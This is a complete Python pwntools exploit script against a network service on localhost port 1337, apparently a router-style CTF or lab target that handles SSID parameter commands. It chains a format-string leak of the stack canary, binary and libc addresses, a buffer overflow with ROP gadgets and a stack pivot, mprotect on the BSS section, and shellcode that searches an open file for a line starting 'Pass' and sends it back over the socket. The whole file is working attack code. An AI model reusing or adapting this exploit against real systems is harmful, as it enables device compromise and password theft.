#!/usr/bin/python3

from pwn import *
from time import sleep

io = remote("127.0.0.1", 1337)

context.arch = "i386"

def getParam(param):
    io.sendline(b"Command.GetParameterValue." + param.encode())
    io.readline(b"[OK] \n")
    ret = io.readline()
    return ret

def setParam(param, value):
    io.sendline(b"Command.SetParameterValue." + param.encode())
    io.readline()
    io.sendline(value)
    io.readline()


# Leaking binary address, stack canary, libc address, socket fd
PAYLOAD = b"%p|%157$p|%168$p|%6$p"
setParam("SSID", PAYLOAD)
leak = getParam("SSID")

leak = leak.rstrip(b"\n").lstrip(b"\r").split(b"|")

BIN_BASE = int(leak[0].decode(), 16) - 0x214b
log.info("Binary base address: {}".format(hex(BIN_BASE)))

BSS = BIN_BASE + 0x6000
log.info("BSS section base address: {}".format(hex(BSS)))

CANARY = int(leak[1].decode(), 16)
log.info("Stack canary: {}".format(hex(CANARY)))

LIBC_BASE = int(leak[2].decode(), 16) - 0x223e34
log.info("Libc base address: {}".format(hex(LIBC_BASE)))

SOCK = int(leak[3].decode(), 16)
log.info("Socket: {}".format(hex(SOCK)))


# libc functions
mprotect = p32(LIBC_BASE + 0x11fe60)
fgets = LIBC_BASE + 0x73130
rewind = LIBC_BASE + 0x7c3b0
send = LIBC_BASE + 0x1281e0

# libc gadgets
pop_eax = p32(LIBC_BASE + 0x12b1f1)
pop_esp = p32(LIBC_BASE + 0x172428)

# binary functions
Read = p32(BIN_BASE + 0x266d)

# binary gadgets
pop_ebx = p32(BIN_BASE + 0x101e)
pop_edi_ebp = p32(BIN_BASE + 0x1b90)
next_inst = p32(BIN_BASE + 0x101b)

call_eax = p32(BIN_BASE + 0x1019)

EXPLOIT  = b"A" * 465
EXPLOIT += p32(CANARY)
EXPLOIT += b"B" * 12

EXPLOIT += Read
EXPLOIT += pop_edi_ebp
EXPLOIT += p32(SOCK)
EXPLOIT += p32(BSS + 0x300)

EXPLOIT += pop_esp # stack pivot
EXPLOIT += p32(BSS + 0x300)

log.info("Stage 1")
setParam("SSID", EXPLOIT)

EXPLOIT = mprotect
EXPLOIT += next_inst

EXPLOIT += p32(BSS)
EXPLOIT += p32(0x1000)
EXPLOIT += p32(0x7)

EXPLOIT += Read
EXPLOIT += next_inst
EXPLOIT += p32(SOCK)
EXPLOIT += p32(BSS + 0x500)
EXPLOIT += b"A" * 4

EXPLOIT += pop_eax
EXPLOIT += p32(BSS + 0x500)

EXPLOIT += call_eax

log.info("Stage 2")
io.sendline(EXPLOIT)

HEAP_END_OFFSET_TO_FP = 0x21e60

# Stage 3
ASM = f"""
    mov esp, {BSS + 0x900}

    xor eax, eax
    xor ebx, ebx

    mov eax, 45
    int 0x80

    sub eax, {HEAP_END_OFFSET_TO_FP}
    push eax

    mov eax, {rewind}
    call eax

    push 0x100
    push {BSS}

read_line:
    mov eax, {fgets}
    call eax
    
    mov ecx, [eax]
    cmp ecx, 0x73736150
    jne read_line
  
    push 0
    push 0x50
    push {BSS}
    push {SOCK}
    
    mov eax, {send}
    call eax
"""

log.info("Stage 3")
sleep(1)
SHELLCODE = asm(ASM)
io.sendline(SHELLCODE)

io.interactive()
